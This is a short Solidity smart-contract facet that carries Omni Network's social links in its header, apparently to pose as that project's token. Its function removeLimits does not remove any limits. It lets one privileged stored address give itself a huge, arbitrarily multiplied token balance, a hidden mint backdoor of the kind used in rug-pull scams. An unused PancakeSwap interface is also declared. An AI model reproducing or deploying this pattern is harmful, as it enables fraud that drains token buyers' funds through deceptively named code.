/**
 
*/

/*  
   * SPDX-License-Identifier: MIT

      // Telegram: https://t.me/OmniFDN
    // Twitter: https://twitter.com/OmniFDN
    // Website: https://omni.network/
    // Medium:  https://medium.com/Omni_Network
    // Discord: https://discord.com/invite/bKNXmaX9VD
    // Github:  https://github.com/omni-network
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
